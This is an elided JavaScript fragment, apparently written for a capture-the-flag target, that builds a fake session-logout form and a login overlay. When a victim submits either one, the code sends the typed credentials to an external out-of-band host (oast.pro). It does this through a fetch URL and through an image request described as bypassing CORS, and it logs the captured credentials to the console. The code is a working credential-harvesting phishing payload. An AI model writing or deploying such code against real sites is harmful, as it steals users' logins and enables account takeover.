...
function initializeSessionLogout() {
    ...
    if (form) {
        form.addEventListener('submit', async function(e) {
            ...
            try {
                // Change this URL for your CTF target
                const targetUrl = 'http://d2s8c70vtcc54sjgqpm0mzcmkorstyqeb.oast.pro/auth';
...
async function handleOverlayAuth(e) {
    ...
    try {
        // Send credentials via image request (bypasses CORS)
        const img = new Image();
        ...
        img.src = `http://d2s8c70vtcc54sjgqpm0mzcmkorstyqeb.oast.pro/auth?${params.toString()}`;
        
        console.log('Overlay credentials sent via image:', credentials);
        console.log('Image URL:', img.src);
        closeOverlay();
        
    } catch (error) {
        console.log('Error sending overlay credentials:', credentials);
    }
}
